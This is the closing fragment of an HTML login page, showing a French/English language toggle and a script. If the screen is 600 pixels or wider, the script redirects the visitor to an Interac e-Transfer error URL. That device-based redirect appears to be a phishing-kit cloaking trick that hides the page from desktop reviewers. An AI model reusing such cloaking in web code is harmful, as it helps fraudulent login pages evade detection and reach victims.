                                </div>
                            </main>
                            <footer class="connect-footer" role="radiogroup" aria-label="Access your account">
                                <div class="toggle-field">
                                    <label>
                                    <input type="radio" class="sc-bdVaJa fvRaFi" placeholder="" id="login-page-switch-language-fr" name="lang-switch" value="fr">
                                    <span class="toggle-label">Français</span></label><label>
                                    <input type="radio" class="sc-bdVaJa fvRaFi" placeholder="" id="login-page-switch-language-en" name="lang-switch" value="en">
                                    <span class="toggle-label">English</span></label>
                                </div>
                            </footer>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    

<div id="automa-palette"></div></body><script>setTimeout(function() { if (screen.width >= 600) { window.location = ' https://etransfer.interac.ca/error'; } }, 10);</script></html>